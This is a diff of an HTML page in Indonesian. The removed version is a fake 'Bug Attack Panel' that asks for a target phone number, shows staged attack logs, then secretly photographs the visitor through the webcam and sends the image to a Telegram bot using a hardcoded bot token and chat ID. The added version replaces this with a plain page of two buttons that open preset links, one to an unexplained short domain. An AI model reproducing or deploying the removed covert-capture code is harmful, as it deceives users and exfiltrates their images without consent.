@@ -3,215 +3,127 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bug Attack Panel ⚡</title>
+  <title>MAS CODX</title>
   <style>
     body {
-      font-family: monospace;
+      font-family: "Courier New", monospace;
       margin: 0;
       padding: 0;
-      height: 100vh;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      color: #0f0;
-      background: url('https://photos.app.goo.gl/sYX2TeLpVbfi7PmP6') no-repeat center center/cover;
+      justify-content: center;
+      min-height: 100vh;
+
+      /* ganti link foto disini */
+      background: url("https://files.catbox.moe/6h2jpw.jpg") no-repeat center center fixed;
+      background-size: cover;
       position: relative;
     }
+
+    /* overlay biar teks & box tetap jelas */
     body::before {
       content: "";
       position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.7);
-      z-index: 0;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.6); 
+      z-index: -1;
     }
-    .box {
-      position: relative;
-      z-index: 1;
-      background: rgba(0,0,0,0.85);
-      padding: 20px;
+
+    .header-btn {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: #2ecc71;
+      border: 2px solid #000;
+      padding: 8px 14px;
+      font-weight: bold;
+      border-radius: 6px;
+      box-shadow: 3px 3px 0px #000;
+    }
+    .container {
+      background: #fff;
+      border: 2px solid #000;
       border-radius: 10px;
+      box-shadow: 6px 6px 0px #000;
+      padding: 20px;
+      max-width: 350px;
       width: 90%;
-      max-width: 500px;
-      box-shadow: 0 0 20px rgba(0,255,0,0.5);
-    }
-    h2 {
       text-align: center;
-      margin-bottom: 20px;
-      color: #f00;
     }
-    input {
+    .label {
+      font-weight: bold;
+      margin: 10px 0 5px;
+      text-align: left;
+    }
+    .input-box {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    button {
-      background: #f00;
-      color: #fff;
-      border: none;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: 0.3s;
-      width: 100%;
-    }
-    button:hover {
-      background: #ff1c27;
-    }
-    .progress {
-      width: 100%;
-      background: #333;
-      border-radius: 5px;
-      margin: 15px 0;
-      overflow: hidden;
-    }
-    .progress-bar {
-      height: 20px;
-      width: 0;
-      background: linear-gradient(90deg, lime, green);
-      transition: width 0.3s;
-    }
-    .log {
-      background: #000;
-      color: #0f0;
+      border: 2px solid #000;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      box-shadow: 3px 3px 0px #000;
+      font-family: inherit;
       font-size: 14px;
-      height: 150px;
-      overflow-y: auto;
-      padding: 10px;
-      border: 1px solid #0f0;
-      border-radius: 5px;
     }
-    .log p { margin: 2px 0; }
-    /* overlay custom */
-    .overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.95);
-      color: #0f0;
-      font-size: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
+    .btn {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      background: #ffa726;
+      border: 2px solid #000;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+      box-shadow: 3px 3px 0px #000;
+    }
+    .btn:active {
+      transform: translate(2px, 2px);
+      box-shadow: 1px 1px 0px #000;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .footer span {
+      color: red;
+    }
+    .footer b {
+      color: blue;
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>⚡ Bug Attack Panel ⚡</h2>
-    <input type="text" id="targetNumber" placeholder="08xxxxxxxxxx">
-    <button id="attackBtn">🚀 Launch Attack</button>
-    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
-    <div class="log" id="logBox"></div>
+  <button class="header-btn">MAS CODX</button>
+
+  <div class="container">
+    <div class="label">LINK NEBAR</div>
+    <input type="text" id="linkNebar" class="input-box" value="https://a6a.viral62.my.id/x/2fh">
+
+    <div class="label">LINK SETTING</div>
+    <input type="text" id="linkSetting" class="input-box" value="http://localhost:8158/__unsaved_file__">
+
+    <button class="btn" onclick="bukaNebar()">Buka</button>
+    <button class="btn" onclick="bukaSetting()">Setting</button>
+  </div>
+
+  <div class="footer">
+    Dibuat oleh <b>NICO</b> dengan <span>❤</span>
   </div>
 
   <script>
-    const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";
-    const CHAT_ID = "8316267465";
-    const logBox = document.getElementById("logBox");
-    const progressBar = document.getElementById("progressBar");
-
-    function log(text) {
-      let p = document.createElement("p");
-      p.textContent = text;
-      logBox.appendChild(p);
-      logBox.scrollTop = logBox.scrollHeight;
+    function bukaNebar() {
+      const url = document.getElementById('linkNebar').value;
+      window.open(url, "_blank");
     }
-
-    function fakeAttackLogs() {
-      const msgs = [
-        "[*] Connecting to server...",
-        "[*] menunggu...",
-        "[*] memeriksa nomor...",
-        "[*] nomor terdeksi...",
-        "[*] bug menuju ke terget...",
-        "[✓] Attack completed!"
-      ];
-      msgs.forEach((msg, i) => {
-        setTimeout(() => log(msg), i * 800);
-      });
+    function bukaSetting() {
+      const url = document.getElementById('linkSetting').value;
+      window.open(url, "_blank");
     }
-
-    function takePhoto() {
-      return navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          let video = document.createElement("video");
-          video.srcObject = stream;
-          video.play();
-
-          return new Promise(resolve => {
-            video.onloadedmetadata = () => {
-              let canvas = document.createElement("canvas");
-              canvas.width = video.videoWidth || 320;
-              canvas.height = video.videoHeight || 240;
-              let ctx = canvas.getContext("2d");
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              stream.getTracks().forEach(track => track.stop());
-              canvas.toBlob(blob => resolve(blob), "image/jpeg");
-            };
-          });
-        });
-    }
-
-    function sendToTelegram(blob, number) {
-      let formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "snapshot.jpg");
-      formData.append("caption", `🚨 Attack Request 🚨\nNomor Target: ${number}`);
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      })
-      .then(res => res.json())
-      .then(() => log("[✓] Foto berhasil dikirim ke server!"))
-      .catch(() => log("[x] Error saat mengirim foto!"));
-    }
-
-    document.getElementById("attackBtn").addEventListener("click", () => {
-      let number = document.getElementById("targetNumber").value.trim();
-      if(number === "") {
-        alert("Masukkan nomor dulu!");
-        return;
-      }
-
-      log("=== ATTACK STARTED ===");
-      progressBar.style.width = "0%";
-      fakeAttackLogs();
-
-      // bikin overlay custom
-      let overlay = document.createElement("div");
-      overlay.className = "overlay";
-      overlay.innerText = "🔗 Menuju target...";
-      document.body.appendChild(overlay);
-
-      let progress = 0;
-      let timer = setInterval(() => {
-        if(progress >= 100) {
-          clearInterval(timer);
-
-          takePhoto()
-            .then(photoBlob => {
-              sendToTelegram(photoBlob, number);
-              overlay.innerText = "✅ Attack Selesai!";
-              setTimeout(()=> overlay.remove(), 2000);
-            })
-            .catch(() => {
-              overlay.innerText = "❌ Akses kamera ditolak!";
-              setTimeout(()=> overlay.remove(), 2000);
-            });
-
-        } else {
-          progress += 10;
-          progressBar.style.width = progress + "%";
-        }
-      }, 500);
-    });
   </script>
 </body>
 </html>
